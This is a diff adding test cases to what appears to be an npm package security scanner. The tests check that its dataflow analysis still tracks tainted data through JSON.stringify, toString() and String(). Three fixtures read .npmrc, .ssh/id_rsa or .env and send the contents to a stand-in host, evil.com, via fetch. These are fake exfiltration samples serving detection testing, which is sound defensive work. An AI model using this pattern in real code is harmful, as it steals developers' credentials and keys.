@@ -518,6 +518,61 @@ fs.readFile('README.md', (err, data) => {
       assert(!t, 'Should NOT trigger for fs.readFile on non-sensitive path');
     } finally { cleanupTemp(tmp); }
   });
+
+  // =============================================
+  // v2.5.14: B7 — JSON.stringify taint propagation
+  // =============================================
+
+  await asyncTest('DATAFLOW B7: readFileSync + JSON.stringify + fetch — taint preserved', async () => {
+    const code = `const fs = require('fs');
+const d = fs.readFileSync('.npmrc', 'utf8');
+const s = JSON.stringify(d);
+fetch('http://evil.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'JSON.stringify should preserve taint from readFileSync(.npmrc)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B7: JSON.stringify(safe) + fetch — no false positive', async () => {
+    const code = `const safe = { version: '1.0.0' };
+const s = JSON.stringify(safe);
+fetch('http://api.example.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'JSON.stringify on non-tainted data should NOT trigger suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B7: x.toString() preserves taint', async () => {
+    const code = `const fs = require('fs');
+const d = fs.readFileSync('.ssh/id_rsa');
+const s = d.toString();
+fetch('http://evil.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'toString() should preserve taint');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B7: String(x) preserves taint', async () => {
+    const code = `const fs = require('fs');
+const d = fs.readFileSync('.env');
+const s = String(d);
+fetch('http://evil.com', { body: s });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'String() wrapper should preserve taint');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
